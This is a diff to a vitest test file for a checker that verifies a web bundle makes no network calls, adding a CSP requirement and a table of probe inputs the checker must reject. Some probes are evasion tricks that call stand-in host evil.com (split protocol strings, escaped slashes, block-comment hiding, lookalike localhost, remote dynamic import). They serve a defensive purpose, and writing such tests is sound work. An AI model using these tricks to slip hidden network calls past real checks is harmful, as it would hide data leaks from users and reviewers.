@@ -4,9 +4,12 @@ import { tmpdir } from 'node:os';
 import { join } from 'node:path';
 import { describe, expect, it } from 'vitest';
 
-function run(files: Record<string, string>): boolean {
+const CSP = `<meta http-equiv="Content-Security-Policy" content="default-src 'self'; connect-src 'self'">`;
+
+function run(files: Record<string, string>, withCsp = true): boolean {
   const dir = mkdtempSync(join(tmpdir(), 'offline-'));
-  for (const [name, body] of Object.entries(files)) {
+  const all = withCsp ? { 'index.html': `<html><head>${CSP}</head></html>`, ...files } : files;
+  for (const [name, body] of Object.entries(all)) {
     mkdirSync(join(dir, name, '..'), { recursive: true });
     writeFileSync(join(dir, name), body);
   }
@@ -19,14 +22,29 @@ function run(files: Record<string, string>): boolean {
 }
 
 describe('[S1] 네트워크 0 검사기', () => {
-  it('passes clean bundles and comment-only credits', () => {
+  it('passes clean bundles and line-comment credits', () => {
     expect(run({ 'a.js': 'const x = 1;\n\t// https://www.shadertoy.com/view/abc\n' })).toBe(true);
   });
-  it('fails on fetch to an absolute URL, sockets, beacons, CDN script and CSS url()', () => {
-    expect(run({ 'a.js': 'fetch("https://api.example.com/x")' })).toBe(false);
-    expect(run({ 'a.js': 'new WebSocket(u)' })).toBe(false);
-    expect(run({ 'a.js': 'navigator.sendBeacon(u)' })).toBe(false);
-    expect(run({ 'i.html': '<script src="https://cdn.example.com/x.js"></script>' })).toBe(false);
-    expect(run({ 'a.css': 'body{background:url(https://example.com/a.png)}' })).toBe(false);
+  const probes: Record<string, Record<string, string>> = {
+    fetchAbs: { 'a.js': 'fetch("https://api.example.com/x")' },
+    socket: { 'a.js': 'new WebSocket(u)' },
+    windowSocket: { 'a.js': 'new window.WebSocket(u)' },
+    beaconAlias: { 'a.js': 'const {sendBeacon:b}=navigator;b(u)' },
+    rtc: { 'a.js': 'new RTCPeerConnection({iceServers:[]})' },
+    cdnScript: { 'i.html': '<script src="https://cdn.example.com/x.js"></script>' },
+    cssUrl: { 'a.css': 'body{background:url(https://example.com/a.png)}' },
+    cssProtoRelative: { 'a.css': '@import url(//fonts.example.com/css);' },
+    escaped: { 'a.js': 'var u="https:\\/\\/evil.com/x"' },
+    blockCommentTrick: { 'a.js': 'a=1/*x*/;fetch(u);var u="https://evil.com"' },
+    wss: { 'a.js': 'var u="wss://evil.com/s"' },
+    lookalikeLocalhost: { 'a.js': 'var u="https://localhost.evil.com/x"' },
+    splitProto: { 'a.js': 'fetch("ht"+"tps://evil.com")' },
+    remoteImport: { 'a.js': 'import("https://evil.com/m.js")' },
+  };
+  for (const [name, files] of Object.entries(probes)) {
+    it(`fails on ${name}`, () => expect(run(files)).toBe(false));
+  }
+  it('fails when the CSP meta is missing', () => {
+    expect(run({ 'index.html': '<html></html>' }, false)).toBe(false);
   });
 });
